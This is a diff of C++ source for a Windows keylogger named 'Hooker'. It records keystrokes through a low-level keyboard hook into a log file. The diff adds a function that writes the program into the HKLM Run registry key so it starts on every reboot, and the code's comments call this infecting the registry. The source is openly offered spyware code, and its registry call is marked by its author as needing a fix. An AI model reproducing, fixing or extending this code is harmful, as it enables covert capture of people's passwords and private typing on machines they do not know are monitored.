@@ -1,25 +1,25 @@
-#include<iostream>
-#include<fstream>
-#include<string>
+
 #include<Windows.h>
-#include<string>
 #include "HookerHead.h"
 #pragma comment(lib,"user32.lib")
-
 using namespace std;
 string str = "";
 const string logFileName = "HookerLogs.txt";
 static bool capsLockPressed = false;
 static bool isShiftPress = false;
 ofstream outStream;
+int fileOpenMode = (int)ios_base::app; //open existing file. Do not overide it !
 const int maxAllowedStringLenght = 50;
 HHOOK hHook = NULL;
+const int bufferSize = 300;
 
 int main(){
 	
 	//Hide the console window and make it run at background 
 	//If you execute the .exe file stop the process manualy
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	
+	AddProgramInHKEY_LOCAL_MACHINERegister();
 	//Open the file stream 
 	//Define the keyboard hook
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HoockCallback, NULL, 0);
@@ -30,9 +30,11 @@ int main(){
 	{
 
 	}
-	outStream.open(logFileName);
+	outStream.open(logFileName,fileOpenMode);
 	outStream << str;
 	outStream.close();
+
+	return 0;
 }
 LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT *)lParam);
@@ -110,4 +112,18 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstrea
 			
 		break;
 	}
+}
+//Administrative access is required in order to execute this fuction
+//If the current logged user is Administrator this will add the Hooker.exe
+//in the registers, so the logger will star on reboot
+//If this is successfull then the Hooker.exe will need only one manual start form the user
+//then he will infect the windows registers
+void AddProgramInHKEY_LOCAL_MACHINERegister() {
+	TCHAR szPath[MAX_PATH];
+	GetModuleFileName(NULL, szPath, MAX_PATH);
+	HKEY newValue;
+	RegOpenKey(newValue, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue); 
+	//To delete this you need to go in the register and manualy delete the Hooker key
+	RegSetValueEx(newValue, "Hoocker", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
+	LSTATUS st = RegCloseKey(newValue); // Need to be fixed!
 }
